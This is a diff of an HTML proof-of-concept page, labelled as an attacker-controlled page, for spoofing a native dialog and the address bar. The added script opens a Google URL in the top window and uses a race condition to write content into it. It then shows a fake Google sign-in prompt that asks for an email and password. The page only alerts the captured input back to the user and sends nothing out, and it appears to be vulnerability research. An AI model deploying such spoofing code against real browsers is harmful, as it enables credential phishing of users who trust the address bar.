@@ -16,29 +16,41 @@
     button {
       padding: 12px 24px;
       font-size: 18px;
-      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-  <button onclick="executeSpoof()">Click to PoC</button>
+  <h2 style="color:red;">Native Dialog & Address Bar Spoofing PoC</h2>
+  <h3>Attacker-controlled page</h3>
+  <button onclick="executeSpoof()">Start PoC</button>
 
   <script>
     function executeSpoof() {
-      document.body.innerHTML = `
-        <div style="text-align:center; padding: 50px;">
-          <h1 style="color: red;">This is not Google!</h1>
-          <p>This is an attacker-controlled page rendering custom HTML.</p>
-        </div>
-      `;
-      let win = window.open('https://google.com:8888', '_top');
+      // 1. Buka URL target dengan path spesifik untuk menghindari pengalihan Universal Links iOS
+      let win = window.open('https://www.google.com/csi', '_top');
+
+      // 2. Race Condition: Injeksi konten DOM sebelum pemutusan konteks navigasi selesai
       setTimeout(() => {
-        let user = prompt('Sign into your account in order to access www.google.com', 'Enter Your E-mail / Password');
-        if (user) {
-          alert('Captured Credentials: ' + user);
+        try {
+          win.document.write(`
+            <body style="margin:0; padding:20px; text-align:center;">
+              <h2>Loading Google Services...</h2>
+              <img src="" onerror="
+                setTimeout(function() {
+                  let user = prompt('Sign into your account in order to access accounts.google.com', 'Enter Your E-mail / Password');
+                  if (user) {
+                    alert('Captured Credentials: ' + user);
+                  }
+                }, 100);
+              ">
+            </body>
+          `);
+          win.document.close();
+        } catch (e) {
+          console.warn("Cross-Origin restriction enforced:", e);
         }
-      }, 100);
+      }, 50);
     }
   </script>
 
